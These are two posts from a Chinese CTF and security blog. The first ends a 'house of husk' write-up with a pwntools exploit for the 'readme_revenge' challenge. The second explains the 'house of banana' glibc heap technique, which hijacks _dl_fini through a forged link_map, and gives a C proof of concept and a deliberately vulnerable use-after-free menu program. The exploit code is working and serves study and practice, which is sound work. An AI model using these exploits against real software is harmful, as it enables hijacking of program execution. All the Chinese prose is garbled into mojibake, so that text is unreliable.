<p>å…ˆç¡®å®š <code>__libc_argv[0]</code> çš„åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141310775.png" alt="image-20230214131007737"></p>
<p>ç„¶åéœ€è¦å‘è¿™ä¸ªåœ°å€é‡Œå†™å…¥ä¸€ä¸ªæŒ‡å‘ <code>flag</code> åœ°å€çš„æŒ‡é’ˆã€‚</p>
<p>æˆ‘å¸ƒç½®çš„æƒ…å†µå¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141311225.png" alt="image-20230214131134190"></p>
<p>ä¸Šè¿°å¸ƒå±€å…¨éƒ¨å®Œæˆï¼Œæ‰§è¡Œ <code>printf((__int64)&quot;Hi, %s. Bye.\n&quot;, name);</code> æ—¶å°±å¯ä»¥å°† <code>flag</code> æ‰“å°å‡ºæ¥</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=load(<span class="string">&#x27;readme_revenge&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x45ad0f</span>)</span><br><span class="line">leak_flag=<span class="number">0x4359B0</span></span><br><span class="line">flag_addr=<span class="number">0x6B4040</span></span><br><span class="line">payload=p64(flag_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x598</span></span><br><span class="line">payload+=p64(<span class="number">0x6B73E0</span>)<span class="comment">#__libc_argv[0]</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x640</span>-<span class="number">0x5a0</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#__printf_function_table</span></span><br><span class="line">payload+=p64(<span class="number">0x0</span>)<span class="comment">#__printf_modifier_table</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+=p64(<span class="number">0x6b7aa8</span>)<span class="comment">#__printf_arginfo_table</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)*<span class="number">0x72</span></span><br><span class="line">payload+=p64(leak_flag)<span class="comment">#__stack_chk_fail</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302141317933.png" alt="image-20230214131708408"></p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ²¡æƒ³åˆ°æ—¥å¸¸ä½¿ç”¨çš„ <code>printf</code> å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥åŠ«æŒæ‰§è¡Œæµçš„ã€‚ä½†éœ€è¦æ³¨æ„è¯¥æ‰‹æ³•çš„åˆ©ç”¨æ¡ä»¶å…¶å®æœ‰äº›è‹›åˆ»ï¼Œè€Œä¸”æ²¡æœ‰åŠæ³•æ§åˆ¶å‚æ•°ï¼Œåªèƒ½åŠ«æŒåˆ° <code>one_gadget</code> æˆ–è€…ä¸éœ€è¦å‚æ•°çš„åœ°å€ã€‚æ‰€ä»¥é™¤äº†å°‘éƒ¨åˆ†çš„é¢˜ç›®å¤–ï¼Œè¯¥æ‰‹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªæœ€ä¼˜çš„é€‰æ‹©ï¼Œä½†é€šè¿‡ <code>house of husk</code> ä¹Ÿè®©æˆ‘äº†è§£åˆ°äº† <code>printf</code> å‡½æ•°ä¸­å¯¹äºè‡ªå®šä¹‰æ ¼å¼åŒ–å­—ç¬¦çš„å¤„ç†æµç¨‹ä»¥åŠå¯åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®ï¼Œæ­£æ‰€è°“æŠ€å¤šä¸å‹èº«ï¼Œ<code>house of husk</code> ç¡®å®æ˜¯ä¸€ä¸ªæœ‰è¶£çš„æ”»å‡»æ€è·¯</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/efb4678.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/efb4678.html" class="post-title-link" itemprop="url">å…³äºhouse of bananaçš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:57:50" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><blockquote>
<p>æ”»å‡»æ•ˆæœï¼š</p>
<p>æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p>
<p>é€‚ç”¨ç‰ˆæœ¬ï¼š<code>glibc2.23</code> åˆ°ç›®å‰æœ€æ–°çš„ <code>2.36</code></p>
<p>æ³¨æ„ï¼š ä½¿ç”¨ <code>setcontext</code> æ¥æ§åˆ¶å¯„å­˜å™¨æ‰“ <code>orw</code> çš„è¯ï¼Œéœ€è¦åœ¨ <code>2.29</code> ç‰ˆæœ¬ä»¥ä¸Šæ‰è¡Œï¼ˆ <code>2.27</code> æ²¡æœ‰åŠæ³•è®© <code>rdx</code> æˆ– <code>rdi</code> ä¸ºå †åœ°å€ï¼‰</p>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ol>
<li>å¯ä»¥ä»»æ„åœ°å€å†™ä¸€ä¸ªå †åœ°å€ï¼ˆé€šå¸¸ä½¿ç”¨ <code>large bin attack</code>ï¼‰</li>
<li>èƒ½å¤Ÿä» <code>main</code> å‡½æ•°è¿”å›æˆ–è€…è°ƒç”¨ <code>exit</code> å‡½æ•°</li>
<li>å¯ä»¥æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€</li>
</ol>
</blockquote>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p><code>link_map</code> ç»“æ„ä½“çš„å­˜å‚¨æ–¹å¼å’Œå †å—é“¾è¡¨ç±»ä¼¼ï¼Œæ˜¯é€šè¿‡ <code>l_next</code> å’Œ <code>l_prev</code> æŒ‡é’ˆæ¥è¿æ¥çš„,è€Œè¿™ä¸ªé“¾è¡¨çš„å¤´æŒ‡é’ˆå°±æ˜¯ <code>_rtld_global</code> ç»“æ„ä½“ä¸­çš„ <code>_ns_loaded</code> æ‰€å­˜å‚¨çš„åœ°å€ã€‚</p>
<p> å¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>large bin attack</code> æˆ–å…¶ä»–æ–¹å¼å°†é“¾è¡¨çš„å¤´æŒ‡é’ˆæ”¹ä¸ºå¯æ§å †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥ä¼ªé€ ç¬¬ä¸€ä¸ª <code>link_map</code> ç»“æ„ä½“ï¼Œä»è€Œæ§åˆ¶ç»“æ„ä½“ä¸­çš„å„ä¸ªå­—æ®µï¼Œä¸‹é¢ä»£ç æ˜¯ <code>_dl_fini</code> å‡½æ•°ä¸­çš„ç‰‡æ®µ</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126686.png" alt="image-20230217212607337" style="zoom:50%;" />

<p>è“è‰²æ¡†ä¸­æ˜¯è¦ç»•è¿‡ <code>if</code> æ£€æŸ¥æ‰€éœ€è¦ä¼ªé€ çš„å­—æ®µï¼Œçº¢è‰²æ¡†ä¸­æ˜¯åŠ«æŒæ‰§è¡Œæµçš„ä½ç½®ã€‚</p>
<p>æœ€ç»ˆçš„ç›®çš„æ˜¯éœ€è¦ä¼ªé€ ä¸€äº›å­—æ®µç»•è¿‡æ£€æŸ¥å¹¶å¸ƒå±€ä¸€äº›å­—æ®µä¸ºåŠ«æŒæ‰§è¡Œæµåšå‡†å¤‡ï¼Œæœ€ç»ˆæ‰§è¡Œåˆ° <code>array[i]</code> æ—¶è¿›è¡ŒåŠ«æŒã€‚</p>
<h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p>é¦–å…ˆéœ€è¦æ¢å¤<code>l_next</code> å­—æ®µåŸæœ¬çš„å€¼ï¼Œè¿™æ ·ä¹‹åçš„ <code>link_map</code> å°±ä¸ç”¨å†ä¼ªé€ äº†ã€‚</p>
<p>å°† <code>l_real</code> å­—æ®µæ”¹ä¸ºä¼ªé€ çš„ <code>link_map</code> åœ°å€ï¼Œä»¥ä¾¿æ»¡è¶³ <code>if (l == l-&gt;l_real)</code> ï¼Œç¡®ä¿ä¸ä¼šè§¦å‘ <code>assert</code></p>
<p>å°† <code>l_info[26]</code> çš„å€¼è®¾ç½®ä¸ºéç©ºï¼Œä¸ºäº†æ»¡è¶³ <code>if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</code></p>
<p>å¦‚æœæ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹ <code>array</code> çš„åœ°å€è¿›è¡Œè®¾ç½®ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ›´ç²¾å‡†çš„æ§åˆ¶ <code>array</code> ï¼Œæˆ‘ä»¬æ§åˆ¶ <code>l_addr</code> ä¸º <code>0</code> ï¼ˆäº‹å®ä¸Šè¿™ä¸ªå€¼é€šå¸¸ä¹Ÿæ²¡æœ‰åŠæ³•è¢«æ§åˆ¶ï¼Œå› ä¸ºè¿™ä¸ª <code>l_addr</code> æ˜¯å †å—çš„ <code>prev_size</code>  å­—æ®µï¼Œæ­£å¸¸æƒ…å†µå°±æ˜¯ <code>0</code>ï¼‰</p>
<p>è€Œ <code>DT_FINI_ARRAY</code> è¿™ä¸ªå®å°±æ˜¯ <code>26</code> ï¼Œ<code>d_un</code> åˆ™æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œå®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">    Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬å°† <code>l-&gt;l_info[26]</code> çš„å€¼è®¾ç½®ä¸º <code>l-&gt;l_info[26]</code> çš„åœ°å€ï¼Œé‚£ä¹ˆ <code>l-&gt;l_info[27]</code> ä¸­çš„å€¼åˆ™æ˜¯ <code>array</code> </p>
<p><strong>æ³¨æ„ï¼š</strong>  <code>-&gt;</code> æ“ä½œç¬¦åœ¨ <code>C</code> è¯­è¨€è¢«å®šä¹‰ä¸ºç»“æ„ä½“æŒ‡é’ˆæˆå‘˜çš„è§£å¼•ç”¨å’Œæˆå‘˜è®¿é—®æ“ä½œç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥æ“ä½œç¬¦å®Œæˆäº†ä¸¤ä¸ªæ“ä½œï¼Œå…ˆå¯¹æŒ‡é’ˆè¿›è¡Œäº†è§£å¼•ç”¨ï¼Œç„¶åå†è®¿é—®æŒ‡é’ˆæ‰€æŒ‡å‘çš„ç»“æ„ä½“æˆå‘˜ã€‚å› æ­¤ä¸Šé¢çš„ä»£ç  <code>l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> è¿›è¡Œäº†ä¸¤æ¬¡è§£å¼•ç”¨æœ€åå°†å€¼èµ‹ç»™ <code>array</code> ï¼Œè€Œ <strong>winmt</strong> å¸ˆå‚…åœ¨ <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">æ–‡ç« </a> ä¸­å†™åˆ° <strong>â€œä»¥åŠl-&gt;l_info[26]-&gt;d_un.d_ptrï¼Œä¹Ÿå°±æ˜¯l-&gt;l_info[27]â€</strong> ï¼Œè¿™å¥è¯æœ‰ç‚¹å°é—®é¢˜ï¼Œå› ä¸ºç†è§£ä¸º <code>l-&gt;l_info[27]</code> çš„è¯ï¼Œåªè¿›è¡Œäº†ä¸€æ¬¡è§£å¼•ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæ›¿ <strong>winmt</strong> å¸ˆå‚…çº æ­£ä¸‹ QAQ</p>
<p>æ¥ä¸‹æ¥æ§åˆ¶ <code>i</code> çš„å€¼ï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br></pre></td></tr></table></figure>

<p><code>DT_FINI_ARRAYSZ</code> è¿™ä¸ªå®æ˜¯ <code>28</code> ï¼Œæ‰€ä»¥å°† <code>l-&gt;l_info[28]</code> çš„å€¼è®¾ç½®ä¸º <code>l-&gt;l_info[28]</code> çš„åœ°å€ï¼Œé‚£ä¹ˆ <code>l-&gt;l_info[29]</code> ä¸­çš„å€¼å†é™¤ <code>8</code> ï¼Œåˆ™æ˜¯æœ€åçš„ <code>i</code></p>
<p>æœ€åçš„åŠ«æŒä½ç½®æ˜¯å‡½æ•°æŒ‡é’ˆ <code>array[i]</code> è¢«è°ƒç”¨ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢å·²ç»æåˆ°äº† <code>array</code> å’Œ <code>i</code> éƒ½å¯ä»¥è¢«æ§åˆ¶ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥æ‰§è¡Œä»£ç ï¼Œå¦‚æœæ‰“ <code>one_gadget</code> è·å– <code>shell</code> çš„è¯ï¼Œç›´æ¥å¸ƒç½®åœ°å€å³å¯ï¼Œä½†æ˜¯æ‰§è¡Œ <code>orw</code> çš„è¯ï¼Œéœ€è¦å…ˆç©ºèµ°ä¸€è½®å‡½æ•°è°ƒç”¨ï¼Œå› ä¸º <code>rdx</code> å†æ¯è½®å¾ªç¯åï¼Œéƒ½ä¼šè¢«æ›´æ–°ä¸ºå †åœ°å€ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172126762.png" alt="image-20230217203244752" style="zoom:50%;" />



<p>èµ°ç©ºä¸€è½®çš„æ„æ€å°±æ˜¯è·³è½¬åˆ° <code>ret</code> æŒ‡ä»¤ä¸Šï¼Œç„¶åç«‹åˆ»é€€å‡ºè¿™ä¸€è½®çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨ï¼Œ<code>i--</code> ç„¶åè°ƒç”¨ä¸‹ä¸€ä¸ª <code>array[i]</code> ä¸­å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆï¼Œæ­¤æ—¶çš„ <code>rdx</code> å·²ç»ä¸ºå †åœ°å€äº†ï¼Œæ‰€ä»¥æ­¤æ—¶å»è·³è½¬åˆ° <code>setcontext+61</code>  çš„ä½ç½®ï¼Œå¸ƒç½® <code>SROP</code> ï¼Œè°ƒç”¨ <code>read</code> å‡½æ•°å†æ¬¡è¯»å…¥ <code>orw</code> çš„ <code>rop</code> é“¾ä½¿å…¶æ­£å¥½è½åˆ° <code>read</code> å‡½æ•°çš„è¿”å›åœ°å€ä¸Šï¼Œä»è€Œç»•è¿‡æ²™ç®±ä¿æŠ¤ã€‚</p>
<p><strong>è¡¥å……ï¼š</strong></p>
<p><code>2.27</code> çš„ <code>libc</code> ä¸­æ²¡åŠæ³•æ§åˆ¶å¯„å­˜å™¨èµ° <code>setcontext</code> ï¼Œå› ä¸ºå…¶æ±‡ç¼–å¦‚ä¸‹</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172129364.png" alt="image-20230217212955875" style="zoom:50%;" />

<p>å¯¹æ¯”ä¸‹é¢è¿™ä¸ªå›¾ç‰‡ï¼ˆ <code>2.31</code> çš„ <code>libc</code>ï¼‰ï¼Œå°±ä¼šå‘ç° <code>2.27</code> æ²¡æœ‰ <code>rdi</code> æˆ–è€… <code>rdx</code> è¢«èµ‹å€¼ä¸ºå †åœ°å€çš„æŒ‡ä»¤,æ‰€ä»¥ä¸å¥½æ‰“ <code>orw</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172131373.png" alt="image-20230217213154837" style="zoom: 50%;" />





<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc poc.c -o poc -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rtld_global_dl_ns 0x61b060</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> one_gadget 0x4f302</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x64e40</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc base %llx\n&quot;</span>,libc_base);</span><br><span class="line">  <span class="type">size_t</span> *p=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  </span><br><span class="line">  p[<span class="number">3</span>]=libc_base+<span class="number">0x61c710</span>;<span class="comment">//l_next</span></span><br><span class="line">  p[<span class="number">5</span>]=p;<span class="comment">//l_real    ä¹Ÿæ˜¯ä¼ªé€ çš„link_mapåœ°å€</span></span><br><span class="line">  p[<span class="number">34</span>]=&amp;p[<span class="number">34</span>];<span class="comment">//l-&gt;l_info[26] DT_FINI_ARRAY</span></span><br><span class="line">  p[<span class="number">35</span>]=&amp;p[<span class="number">38</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr    </span></span><br><span class="line">  p[<span class="number">36</span>]=&amp;p[<span class="number">36</span>];<span class="comment">//l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">  p[<span class="number">37</span>]=<span class="number">0x8</span>;<span class="comment">//i=l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">  p[<span class="number">38</span>]=libc_base+one_gadget;<span class="comment">//call array[i]</span></span><br><span class="line">  p[<span class="number">0x62</span>]=<span class="number">0x800000000</span>;<span class="comment">//ä½¿l-&gt;l_init_called ä¸º1</span></span><br><span class="line">  *(<span class="type">size_t</span> *)(rtld_global_dl_ns+libc_base)=p;<span class="comment">//åŠ«æŒ_rtld_global_ns_loaded  ç›®çš„ä¼ªé€ link_map</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœï¼š</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172153387.png" alt="image-20230217215313299" style="zoom: 67%;" />



<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>è‡ªå·±å†™äº†ä¸€ä¸ªç¨‹åºï¼Œæ‰“äº†ä¸€ä¸‹ <code>house of banana</code> ï¼Œæˆ‘å…ˆæ˜¯ç¼–è¯‘å®Œä¹‹åï¼Œå¯¹åº”çš„æ˜¯ <code>libc2.27</code> ï¼Œæˆ‘ç”¨ <code>house of banana</code> åŠ«æŒæ‰§è¡Œæµåæ‰“çš„ <code>og</code> è·å–äº† <code>shell</code> ï¼Œç„¶ååˆ <code>patch</code> æˆäº† <code>2.31-0ubuntu9_amd64</code> æ‰“çš„ <code>orw</code> </p>
<p><code>C</code> æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 18.04     GLIBC 2.27-3ubuntu1.6</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index,size;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line">	<span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line">	<span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> choice;</span><br><span class="line">	init();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">		<span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">			add();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">			show();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">			edit();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">			delete();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸çš„èœå•å †ï¼Œè‚¯å®šæ˜¯æœ‰å…¶ä»–è§£æ³•ï¼Œè¿™é‡Œåªè€ƒè™‘ <code>house of banana</code> ï¼Œæ¼æ´å°±ä¸€ä¸ª <code>UAF</code> ã€‚</p>
